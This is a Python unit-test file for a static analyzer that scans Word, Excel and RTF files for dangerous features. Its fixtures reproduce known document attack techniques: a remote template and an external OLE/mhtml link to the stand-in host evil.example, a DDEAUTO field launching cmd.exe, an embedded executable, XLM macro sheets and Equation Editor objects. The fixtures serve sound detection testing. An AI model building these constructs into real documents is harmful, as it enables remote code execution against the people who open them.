import tempfile
import unittest
import zipfile
from pathlib import Path

from app.static_analysis.office_analyzer import analyze_office, OLE_MAGIC


class OfficeTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def write(self, name, content):
        p = self.dir / name
        p.write_bytes(content)
        return p

    def ooxml(self, name, extra=None, content_types=True):
        files = {"word/document.xml": "<w:document/>"}
        if content_types:
            files["[Content_Types].xml"] = "<Types/>"
        files.update(extra or {})
        p = self.dir / name
        with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
            for n, c in files.items():
                z.writestr(n, c)
        return p

    def ids(self, path):
        env = analyze_office(path)
        return env, {f["id"]: f["severity"] for f in env["findings"]}

    def test_plain_zip_is_skipped(self):
        self.assertEqual(analyze_office(self.ooxml("a.zip", content_types=False))["status"], "skipped")

    def test_text_file_is_skipped(self):
        self.assertEqual(analyze_office(self.write("a.txt", b"hello"))["status"], "skipped")

    def test_clean_docx_has_no_findings(self):
        env, found = self.ids(self.ooxml("a.docx"))
        self.assertEqual(env["status"], "ok")
        self.assertEqual(found, {})

    def test_macros_in_docm(self):
        self.assertEqual(self.ids(self.ooxml("a.docm", {"word/vbaProject.bin": b"\x00"}))[1]["OFFICE_VBA_MACROS"], "medium")

    def test_remote_template_is_high(self):
        rels = ('<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
                'officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" '
                'TargetMode="External"/></Relationships>')
        found = self.ids(self.ooxml("a.docx", {"word/_rels/settings.xml.rels": rels}))[1]
        self.assertEqual(found["OFFICE_REMOTE_TEMPLATE"], "high")

    def test_external_ole_object_is_high(self):
        rels = ('<Relationships><Relationship Id="rId1" Type="http://x/relationships/oleObject" '
                'Target="mhtml:http://evil.example/a.html!x-usc:http://evil.example/a.html" '
                'TargetMode="External"/></Relationships>')
        found = self.ids(self.ooxml("a.docx", {"word/_rels/document.xml.rels": rels}))[1]
        self.assertEqual(found["OFFICE_EXTERNAL_OBJECT"], "high")

    def test_ordinary_hyperlink_is_not_a_finding(self):
        rels = ('<Relationships><Relationship Id="rId1" Type="http://x/relationships/hyperlink" '
                'Target="https://example.org" TargetMode="External"/></Relationships>')
        env, found = self.ids(self.ooxml("a.docx", {"word/_rels/document.xml.rels": rels}))
        self.assertEqual(found, {})
        self.assertEqual(env["data"]["hyperlinks"], ["https://example.org"])

    def test_dde_auto_is_high(self):
        doc = '<w:document><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\cmd.exe "/k calc" </w:instrText></w:document>'
        self.assertEqual(self.ids(self.ooxml("a.docx", {"word/document.xml": doc}))[1]["OFFICE_DDE"], "high")

    def test_embedded_executable_is_high(self):
        found = self.ids(self.ooxml("a.docx", {"word/embeddings/payload.exe": b"MZ"}))[1]
        self.assertEqual(found["OFFICE_EMBEDDED_EXECUTABLE"], "high")

    def test_excel4_macro_sheet_is_high(self):
        p = self.dir / "a.xlsm"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("[Content_Types].xml", "<x/>")
            z.writestr("xl/workbook.xml", "<x/>")
            z.writestr("xl/macrosheets/sheet1.xml", "<x/>")
        self.assertEqual(self.ids(p)[1]["OFFICE_XLM_MACRO"], "high")

    def test_old_binary_doc_with_macros(self):
        raw = OLE_MAGIC + b"\x00" * 100 + "WordDocument".encode("utf-16-le") + "_VBA_PROJECT".encode("utf-16-le")
        env, found = self.ids(self.write("a.doc", raw))
        self.assertEqual(env["data"]["app_kind"], "word")
        self.assertIn("OFFICE_VBA_MACROS", found)

    def test_rtf_with_equation_object(self):
        rtf = rb"{\rtf1{\object\objemb{\*\objclass Equation.3}{\*\objdata 0102}}}"
        found = self.ids(self.write("a.rtf", rtf))[1]
        self.assertIn("OFFICE_RTF_OBJECT", found)
        self.assertIn("OFFICE_EQUATION_EDITOR", found)

    def test_corrupt_zip_does_not_crash(self):
        self.assertEqual(analyze_office(self.write("a.docx", b"PK\x03\x04garbage"))["status"], "error")


if __name__ == "__main__":
    unittest.main()
    